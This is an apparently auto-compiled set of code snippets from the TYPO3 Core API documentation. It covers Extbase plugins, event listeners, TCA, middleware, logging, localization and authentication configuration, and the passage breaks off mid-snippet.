https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Namespaces/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndefined('TYPO3') or die();\n\n\\TYPO3\\CMS\\Extbase\\Utility\\ExtensionUtility::configurePlugin(\n    'MyExtension',\n    'Pi1',\n    [\n        \\MyVendor\\MyExtension\\Controller\\MyPluginController::class => 'list, show',\n    ],\n    // non-cacheable actions\n    [\n        \\MyVendor\\MyExtension\\Controller\\MyPluginController::class => 'create, update, delete',\n    ]\n);\n```\n\n----------------------------------------\n\nTITLE: RST Figure Directive for Install Tool Screenshot\nDESCRIPTION: ReStructuredText directive for displaying a screenshot of the TYPO3 Install Tool enable screen with shadow styling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/AdminTools/EnableInstallTool.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/AdminTools/EnableInstallTool.png\n   :class: with-shadow\n\n   Screen to enable the Install Tool\n```\n\n----------------------------------------\n\nTITLE: Defining Tea Model Class in TYPO3 CMS with Extbase\nDESCRIPTION: This code defines a Tea model class using TYPO3 CMS Extbase framework. It includes a lazy-loaded image property with getter and setter methods. The getter method handles lazy loading of the image FileReference.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/Tea/Classes/Domain/Model/TeaImage.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Extbase\\Annotation as Extbase;\nuse TYPO3\\CMS\\Extbase\\Domain\\Model\\FileReference;\nuse TYPO3\\CMS\\Extbase\\DomainObject\\AbstractEntity;\nuse TYPO3\\CMS\\Extbase\\Persistence\\Generic\\LazyLoadingProxy;\n\nclass Tea extends AbstractEntity\n{\n    /**\n     * @var FileReference|null\n     * @phpstan-var FileReference|LazyLoadingProxy|null\n     * @Extbase\\ORM\\Lazy\n     */\n    protected $image;\n\n    public function getImage(): ?FileReference\n    {\n        if ($this->image instanceof LazyLoadingProxy) {\n            /** @var FileReference $image */\n            $image = $this->image->_loadRealInstance();\n            $this->image = $image;\n        }\n\n        return $this->image;\n    }\n\n    public function setImage(FileReference $image): void\n    {\n        $this->image = $image;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Color Settings Configuration in YAML\nDESCRIPTION: Example showing how to define a color type site setting that accepts various color code formats.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSettingDefinitions.rst#2025-04-16_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nsettings:\n  foo:\n    type: color\n    label: 'Foo'\n    default: '#000000'\n```\n\n----------------------------------------\n\nTITLE: Defining Online Media Preview Event Handler Class in TYPO3\nDESCRIPTION: Class definition for AfterVideoPreviewFetchedEvent that handles post-processing of video preview images. Includes methods for accessing the media file, online media ID, and managing preview image filenames.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterVideoPreviewFetchedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\OnlineMedia\\Event;\n\nclass AfterVideoPreviewFetchedEvent\n{\n    public function getFile(): \\TYPO3\\CMS\\Core\\Resource\\File;\n    public function getOnlineMediaId(): string;\n    public function getPreviewImageFilename(): string;\n    public function setPreviewImageFilename(string $previewImageFilename);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing TYPO3 Module Controller with Clipboard Debug\nDESCRIPTION: Example of a TYPO3 module controller class that demonstrates how to initialize and debug clipboard contents. Shows proper dependency injection and utility usage for clipboard operations in the TYPO3 backend context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Examples/Clipboard/DebugClipboard.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Backend\\Clipboard\\Clipboard;\nuse TYPO3\\CMS\\Core\\Utility\\DebugUtility;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\nclass ModuleController extends ActionController implements LoggerAwareInterface\n{\n    protected function debugClipboard()\n    {\n        /** @var $clipboard Clipboard */\n        $clipboard = GeneralUtility::makeInstance(Clipboard::class);\n        // Read the clipboard content from the user session\n        $clipboard->initializeClipboard();\n        DebugUtility::debug($clipboard->clipData);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Incorrect Folder Structure for TYPO3 Root\nDESCRIPTION: This code snippet shows an example of an incorrect folder structure for a TYPO3 installation where the web root is the same as the project root. This structure is considered insecure as it exposes the vendor directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/Requirements.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ tree typo3_root\n├── index.php\n├── fileadmin/\n├── typo3/\n├── typo3conf/\n└── typo3temp/\n```\n\n----------------------------------------\n\nTITLE: Configuring Form Layout in TYPO3 TCA Types\nDESCRIPTION: This snippet defines the types configuration in TCA which controls how fields are arranged in the backend form. It specifies which fields to display and in what order.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/Model.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n'types' => [\n    '1' => ['showitem' => 'title, description, image, --div--;LLL:EXT:core/Resources/Private/Language/Form/locallang_tabs.xlf:language, sys_language_uid, l10n_parent, l10n_diffsource, --div--;LLL:EXT:core/Resources/Private/Language/Form/locallang_tabs.xlf:access, hidden, starttime, endtime'],\n],\n```\n\n----------------------------------------\n\nTITLE: Configuring Request Middlewares in TYPO3 CMS (PHP)\nDESCRIPTION: This code defines request middleware configurations for a TYPO3 extension. It specifies middleware identifiers, target classes, and execution order (before and after) for both frontend and backend contexts. The configuration is returned as an array, typically placed in the file EXT:some_extension/Configuration/RequestMiddlewares.php.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Extension/Configuration/RequestMiddlewares.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nreturn [\n    'frontend' => [\n        'middleware-identifier' => [\n            'target' => \\Vendor\\SomeExtension\\Middleware\\ConcreteClass::class,\n            'before' => [\n                'another-middleware-identifier',\n            ],\n            'after' => [\n                'yet-another-middleware-identifier',\n            ],\n        ],\n    ],\n    'backend' => [\n        'middleware-identifier' => [\n            'target' => \\Vendor\\SomeExtension\\Middleware\\AnotherConcreteClass::class,\n            'before' => [\n                'another-middleware-identifier',\n            ],\n            'after' => [\n                'yet-another-middleware-identifier',\n            ],\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Automatic File Upload Handling Using PHP Attributes in TYPO3\nDESCRIPTION: This snippet illustrates using PHP attributes for automatic file upload management in Extbase with TYPO3 v13.3 and above. It streamlines handling by using a custom ViewHelper and attributes within the domain model.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/FileUpload.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n// EXT:my_extension/Classes/Domain/Model/Blog.php, using FileUpload attributes\nnamespace Vendor\\MyExtension\\Domain\\Model;\nuse TYPO3\\CMS\\Extbase\\Annotation\\FileUpload;\n\nclass Blog {\n\n    #[FileUpload(\n        validation: [\n            'required' => true,\n            'maxFiles' => 1,\n            'fileSize' => [\n                'maxSize' => 1000000,\n            ],\n            'allowedMimeTypes' => ['image/jpeg', 'image/png'],\n        ],\n        uploadFolder: '1:/user_upload/images/',\n    )]\n    protected ?\\TYPO3\\CMS\\Extbase\\Domain\\Model\\FileReference $image = null;\n\n    // Getter and setter\n    public function getImage(): ?\\TYPO3\\CMS\\Extbase\\Domain\\Model\\FileReference {\n        return $this->image;\n    }\n\n    public function setImage(?\\TYPO3\\CMS\\Extbase\\Domain\\Model\\FileReference $image): void {\n        $this->image = $image;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AfterCachedPageIsPersistedEvent Class Methods in TYPO3 CMS\nDESCRIPTION: PHP class definition for AfterCachedPageIsPersistedEvent with methods to handle page caching functionality. The class provides methods to access request information, controller, cache identifier, cache data, and cache lifetime. This event is triggered after cached content is stored but not when pages are served from cache or when caching is disabled.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/AfterCachedPageIsPersistedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Frontend\\Event;\n\nclass AfterCachedPageIsPersistedEvent {\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface;\n    public function getController(): \\TYPO3\\CMS\\Frontend\\Controller\\TypoScriptFrontendController;\n    public function getCacheIdentifier(): string;\n    public function getCacheData(): array;\n    public function getCacheLifetime(): int;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyGenericBackendMessagesEvent Listener in TYPO3\nDESCRIPTION: Example event listener class that adds a custom message to the TYPO3 backend's About module. It demonstrates implementing a listener for the ModifyGenericBackendMessagesEvent and creating a personalized message.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyGenericBackendMessagesEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Controller\\Event\\ModifyGenericBackendMessagesEvent;\nuse TYPO3\\CMS\\Core\\Authentication\\BackendUserAuthentication;\nuse TYPO3\\CMS\\Core\\Localization\\LanguageService;\n\n#[\\TYPO3\\CMS\\Core\\Attribute\\AsEventListener]\nfinal class MyEventListener\n{\n    public function __invoke(ModifyGenericBackendMessagesEvent $event): void\n    {\n        $messages = [];\n        $username = $this->getBackendUser()->user['username'] ?? '';\n\n        if ($username !== '') {\n            $messages[] = sprintf(\n                $this->getLanguageService()->sL('LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:message.greetUser'),\n                $username\n            );\n        }\n\n        if (count($messages) > 0) {\n            $event->addMessage(\n                'My Module name',\n                $messages\n            );\n        }\n    }\n\n    protected function getBackendUser(): BackendUserAuthentication\n    {\n        return $GLOBALS['BE_USER'];\n    }\n\n    protected function getLanguageService(): LanguageService\n    {\n        return $GLOBALS['LANG'];\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Adjusting ThreadStackSize for TYPO3 on Windows\nDESCRIPTION: Configuration snippet to increase the ThreadStackSize on Windows systems. This adjustment is necessary to prevent rendering issues in the TYPO3 extension manager.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Troubleshooting/WebServer.rst#2025-04-16_snippet_1\n\nLANGUAGE: none\nCODE:\n```\n<IfModule mpm_winnt_module>\n  ThreadStackSize 8388608\n</IfModule>\n```\n\n----------------------------------------\n\nTITLE: Using Custom Gravatar ViewHelper in Fluid Template\nDESCRIPTION: Example of how to call a custom Gravatar ViewHelper in a Fluid template. The template imports a custom namespace with prefix 'm' and uses the ViewHelper to display a gravatar image based on an email address.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/DevelopCustomViewhelper.rst#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<html xmlns:f=\"http://typo3.org/ns/TYPO3/CMS/Fluid/ViewHelpers\"\n      xmlns:m=\"http://typo3.org/ns/MyVendor/MyExtension/ViewHelpers\"\n      data-namespace-typo3-fluid=\"true\">\n\n<m:gravatar emailAddress=\"{user.email}\" alt=\"{user.name}\" />\n\n</html>\n```\n\n----------------------------------------\n\nTITLE: Defining Backend Ajax Routes in TYPO3 PHP\nDESCRIPTION: This snippet defines the routes for Ajax requests that are used in the TYPO3 backend. It allows for the handling of Ajax calls seamlessly within the backend interface. The primary dependency is the TYPO3 CMS, which provides the routing mechanisms. The expected input is the request URI, and the output is the corresponding response for the Ajax request.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Configuration/Backend/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n..  typo3:file:: AjaxRoutes.php\n    :scope: extension\n    :path: /Configuration/Backend/\n    :regex: /^.*Configuration\\/Backend\\/AjaxRoutes\\.php$/\n    :shortDescription: Defines routes for backend Ajax requests\n\n    In this file routes for Ajax requests that should be used in the backend can\n    be defined.\n\n    Read more about :ref:`Using Ajax in the backend <ajax-backend>`.\n```\n\n----------------------------------------\n\nTITLE: Custom Event Listener with Custom Source Implementation (PHP)\nDESCRIPTION: This example shows a custom event listener that removes the default PlainSlugReplacementSource and adds a custom source implementation. It demonstrates how to manipulate the sources for which redirects should be created.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Redirects/SlugRedirectChangeItemCreatedEvent.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Redirects\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Attribute\\AsEventListener;\nuse TYPO3\\CMS\\Redirects\\Event\\SlugRedirectChangeItemCreatedEvent;\nuse TYPO3\\CMS\\Redirects\\RedirectUpdate\\PlainSlugReplacementSource;\nuse MyVendor\\MyExtension\\Redirects\\CustomSource;\n\n#[AsEventListener(\n    identifier: 'my-extension/manage-redirect-sources'\n)]\nfinal class MyEventListener\n{\n    public function __invoke(SlugRedirectChangeItemCreatedEvent $event): void\n    {\n        $sources = $event->getSources();\n        foreach ($sources as $key => $source) {\n            if ($source instanceof PlainSlugReplacementSource) {\n                unset($sources[$key]);\n            }\n        }\n        $event->setSources($sources);\n        $event->addSource(new CustomSource());\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Default TYPO3 Service Type Settings\nDESCRIPTION: Example of setting default configuration values for all services of a specific type using the 'default' keyword instead of a specific service key.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Configuration/ServiceConfiguration.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SVCONF'][service type]['default'][config key] = value;\n```\n\n----------------------------------------\n\nTITLE: Creating RST Reference Label for Online Users Submodule\nDESCRIPTION: This RST directive creates a reference label for the Online Users submodule section in the TYPO3 documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendUsers/Index.rst#2025-04-16_snippet_9\n\nLANGUAGE: rst\nCODE:\n```\n..  _user-management-backend-users-online:\n```\n\n----------------------------------------\n\nTITLE: Configuring Crop Variants for Specific tt_content Element Types in TYPO3\nDESCRIPTION: Advanced configuration showing how to set crop variants for specific content element types using columnsOverrides. Includes disabling default variant and setting custom aspect ratios.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CropVariants/ContentElement/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TCA']['tt_content']['types']['textmedia']['columnsOverrides']['assets']['config']['overrideChildTca']['columns']['crop']['config'] = [\n    'cropVariants' => [\n       'default' => [\n           'disabled' => true,\n       ],\n       'mobile' => [\n           'title' => 'LLL:EXT:ext_key/Resources/Private/Language/locallang.xlf:imageManipulation.mobile',\n           'cropArea' => [\n               'x' => 0.1,\n               'y' => 0.1,\n               'width' => 0.8,\n               'height' => 0.8,\n           ],\n           'allowedAspectRatios' => [\n               '4:3' => [\n                   'title' => 'LLL:EXT:core/Resources/Private/Language/locallang_wizards.xlf:imwizard.ratio.4_3',\n                   'value' => 4 / 3\n               ],\n               'NaN' => [\n                   'title' => 'LLL:EXT:core/Resources/Private/Language/locallang_wizards.xlf:imwizard.ratio.free',\n                   'value' => 0.0\n               ],\n           ],\n       ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Downloading TYPO3 Source Package on Linux\nDESCRIPTION: Command to download the TYPO3 v13 source package using wget from the official TYPO3 download server.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/LegacyInstallation.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nwget --content-disposition https://get.typo3.org/13\n```\n\n----------------------------------------\n\nTITLE: Configuring SyslogWriter for Examples extension in TYPO3\nDESCRIPTION: This snippet shows how to configure a SyslogWriter for the controllers of the 'examples' extension in TYPO3. It applies to WARNING level and above.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Configuration/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['LOG']['T3docs']['Examples']['Controller']['writerConfiguration'] = [\n    // Configuration for WARNING severity, including all\n    // levels with higher severity (ERROR, CRITICAL, EMERGENCY)\n    \\Psr\\Log\\LogLevel::WARNING => [\n        // Add a SyslogWriter\n        \\TYPO3\\CMS\\Core\\Log\\Writer\\SyslogWriter::class => [],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Defining Post Model Class in PHP for TYPO3 BlogExample\nDESCRIPTION: This code snippet defines the Post class for the TYPO3 BlogExample extension. It extends AbstractEntity and implements the Stringable interface. The class includes a protected property 'blog' of type Blog, which can be null.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Domain/Relationship1onN1.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nclass Post extends AbstractEntity implements \\Stringable\n{\n    protected ?Blog $blog = null;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing IsFileSelectableEvent Listener in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet demonstrates how to implement a listener for the IsFileSelectableEvent in TYPO3 CMS. It checks if the file is an image and if its dimensions meet certain criteria before allowing selection.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/IsFileSelectableEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\ElementBrowser\\Event\\IsFileSelectableEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(IsFileSelectableEvent $event): void\n    {\n        $file = $event->getFile();\n\n        // Check if file is an image\n        if ($file->getExtension() === 'jpg' || $file->getExtension() === 'png') {\n            // Get image dimensions\n            $width = $file->getProperty('width');\n            $height = $file->getProperty('height');\n\n            // Only allow selection if image is at least 400x400 pixels\n            if ($width >= 400 && $height >= 400) {\n                $event->setSelectable(true);\n            } else {\n                $event->setSelectable(false);\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Fluid Partial Location for Content Elements (HTML)\nDESCRIPTION: Illustrates the typical location for Fluid partials used to override Fluid-Styled Content.  These partials are generally placed in `/Resources/Private/ContentElements/Partials/`.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Resources/Private/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: HTML\nCODE:\n```\n\"/Resources/Private/ContentElements/Partials/SomePartials.html\"\n```\n\n----------------------------------------\n\nTITLE: Defining Blog Post Entity Class in TYPO3\nDESCRIPTION: Creates a Post class that extends AbstractEntity with typed properties for author management. Includes a primary author property and an optional secondary author using PHP's union types.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Domain/RelationshipNon1Uni.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nclass Post extends AbstractEntity\n{\n    /**\n     * @var Person\n     */\n    protected Person $author;\n\n    protected Person|null $secondAuthor;\n}\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Core Patch Example\nDESCRIPTION: Example diff file showing the format of a patch for the TYPO3 Core. This patch modifies the GeneralUtility class to improve code structure in the createVersionNumberedFilename method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/ApplyingCorePatches/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: diff\nCODE:\n```\ndiff --git a/Classes/Utility/GeneralUtility.php b/Classes/Utility/GeneralUtility.php\nindex be47cfe..08fd6fc 100644\n--- a/Classes/Utility/GeneralUtility.php\n+++ b/Classes/Utility/GeneralUtility.php\n@@ -2282,17 +2282,24 @@\n      */\n     public static function createVersionNumberedFilename($file)\n     {\n+        $isFrontend = ($GLOBALS['TYPO3_REQUEST'] ?? null) instanceof ServerRequestInterface\n+            && ApplicationType::fromRequest($GLOBALS['TYPO3_REQUEST'])->isFrontend();\n         $lookupFile = explode('?', $file);\n         $path = $lookupFile[0];\n\n-        if (($GLOBALS['TYPO3_REQUEST'] ?? null) instanceof ServerRequestInterface\n-            && ApplicationType::fromRequest($GLOBALS['TYPO3_REQUEST'])->isFrontend()\n-        ) {\n+        if ($isFrontend) {\n             $mode = strtolower($GLOBALS['TYPO3_CONF_VARS']['FE']['versionNumberInFilename']);\n             if ($mode === 'embed') {\n                 $mode = true;\n```\n\n----------------------------------------\n\nTITLE: ModifyAllowedItemsEvent Class Definition with Methods\nDESCRIPTION: PHP class that manages the list of allowed link types in TYPO3's backend. Includes methods for getting all allowed items, adding new items, removing items, and retrieving current link parts. This event class allows extensions to modify the list of allowed link types.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyAllowedItemsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Controller\\Event;\n\nclass ModifyAllowedItemsEvent\n{\n    public function getAllowedItems(): array\n    {\n        // Returns array of allowed items\n    }\n\n    public function addAllowedItem(string $item): self\n    {\n        // Adds an allowed item\n    }\n\n    public function removeAllowedItem(string $new): self\n    {\n        // Removes an allowed item\n    }\n\n    public function getCurrentLinkParts(): array\n    {\n        // Returns array of current link parts\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining CacheWarmupEvent Class in PHP for TYPO3 CMS Core Cache\nDESCRIPTION: This code snippet defines the CacheWarmupEvent class, which is fired when caches are to be warmed up in TYPO3 CMS. It includes methods to get and set items, as well as to check if the event should stop propagation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Cache/CacheWarmupEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class CacheWarmupEvent\n{\n    /**\n     * @var array<string, mixed>\n     */\n    private array $items = [];\n    private bool $stopPropagation = false;\n\n    public function getItems(): array\n    {\n        return $this->items;\n    }\n\n    public function setItems(array $items): void\n    {\n        $this->items = $items;\n    }\n\n    public function isPropagationStopped(): bool\n    {\n        return $this->stopPropagation;\n    }\n\n    public function stopPropagation(): void\n    {\n        $this->stopPropagation = true;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: RST Image Include\nDESCRIPTION: Includes screenshot images for language management interface\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendLanguages.rst#2025-04-16_snippet_3\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Images/AutomaticScreenshots/Modules/ManageLanguage.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Listing Sites using TYPO3 CLI - Composer Installation\nDESCRIPTION: Command to list all configured TYPO3 sites including their identifier, root page, base URL, languages, locales and enabled status using Composer-based installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/CliTools.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 site:list\n```\n\n----------------------------------------\n\nTITLE: Listing Files in Folder using TYPO3 FAL\nDESCRIPTION: Example of retrieving all files from a specific folder.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesFileFolder.rst#2025-04-16_snippet_10\n\nLANGUAGE: php\nCODE:\n```\n$resourceFactory = \\TYPO3\\CMS\\Core\\Resource\\ResourceFactory::getInstance();\n$storage = $resourceFactory->getDefaultStorage();\n$folder = $storage->getFolder('/some/path/');\n$files = $storage->getFilesInFolder($folder);\n```\n\n----------------------------------------\n\nTITLE: Basic XLIFF File Structure in TYPO3 CMS (XML)\nDESCRIPTION: Example of a basic XLIFF file structure for TYPO3 extensions. The file defines translatable strings with their unique IDs and source text in English. This is the default language file that serves as the base for translations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/XliffFormat.rst#2025-04-16_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\" ?>\n<xliff version=\"1.0\">\n   <file source-language=\"en\" datatype=\"plaintext\" original=\"EXT:my_ext/Resources/Private/Language/Modules/module_name.xlf\">\n      <body>\n         <trans-unit id=\"mlang_labels_tablabel\">\n            <source>A Description Text</source>\n         </trans-unit>\n         <trans-unit id=\"mlang_labels_tabdescr\">\n            <source>A long description</source>\n         </trans-unit>\n         <trans-unit id=\"mlang_tabs_tab\">\n            <source>The Backend Module Name</source>\n         </trans-unit>\n      </body>\n   </file>\n</xliff>\n```\n\n----------------------------------------\n\nTITLE: Implementing Sudo Mode Authentication Service in PHP\nDESCRIPTION: This code snippet demonstrates how to implement a custom authentication service for sudo mode in TYPO3 extensions. It shows how to intercept valid login requests instead of all authUser invocations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/SudoMode.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Authentication;\n\nuse TYPO3\\CMS\\Core\\Authentication\\AbstractAuthenticationService;\n\nclass MyAuthenticationService extends AbstractAuthenticationService\n{\n    public function authUser(array $user): int\n    {\n        if (!$this->isActualLoginRequest()) {\n            // skip auth chain for non-login requests (e.g. sudo mode)\n            return self::STATUS_AUTHENTICATION_SUCCESS_BREAK;\n        }\n        // proceed with custom authentication\n        return $this->customAuthenticationLogic($user);\n    }\n\n    protected function isActualLoginRequest(): bool\n    {\n        return ($this->authInfo['loginType'] === 'BE'\n            && $this->login['status'] === 'login'\n            && !empty($this->login['uident'])\n        );\n    }\n\n    protected function customAuthenticationLogic(array $user): int\n    {\n        // custom authentication logic\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Custom MFA Provider in TYPO3 (YAML)\nDESCRIPTION: This snippet demonstrates how to register a custom MFA provider in TYPO3's Services.yaml file. It configures the provider with a specific identifier and allows customization of its position and default provider status.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/MultiFactorAuthentication/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  MyVendor\\MyExtension\\Authentication\\Mfa\\MyProvider:\n    tags:\n      - name: mfa.provider\n        identifier: 'my-provider'\n        title: 'LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:myProvider.title'\n        description: 'LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:myProvider.description'\n        setupInstructions: 'LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:myProvider.setupInstructions'\n        icon: 'EXT:my_extension/Resources/Public/Icons/my-provider.svg'\n        before: 'totp'\n        after: 'recovery-codes'\n        defaultProviderAllowed: true\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyInlineElementControlsEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates how to create an event listener for the ModifyInlineElementControlsEvent in TYPO3. It shows how to modify existing controls, add new controls, or remove controls for inline elements in the TYPO3 backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyInlineElementControlsEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse 